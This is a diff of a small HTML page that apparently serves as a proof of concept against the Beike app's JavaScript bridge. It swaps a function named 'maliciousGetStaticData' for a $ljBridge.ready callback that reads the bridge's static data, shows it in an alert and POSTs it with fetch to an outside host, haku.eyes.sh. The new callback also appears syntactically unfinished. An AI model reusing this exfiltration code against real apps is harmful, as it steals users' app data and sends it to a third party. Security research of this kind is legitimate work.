@@ -8,18 +8,16 @@
 <body>
     <h1>贝壳JSB</h1>
 </body>
-
+<script src="https://s1.ljcdn.com/m-base/release/v04.4/asset/bridge_d0b9f70cd88e0a5q.js"></script>
 <script>
-
-function maliciousGetStaticData() {
-    var data = window.HybridBridgeLJ._getStaticData();
+  $ljBridge.ready(function(bridge, webStatus) {
+    var data = bridge.getStaticData();
+    alert(data);
     fetch("http://haku.eyes.sh?beike", {
     method: "POST",
     body: data
     });
-    alert(data);
  }
 
- maliciousGetStaticData();
 </script>
 </html>
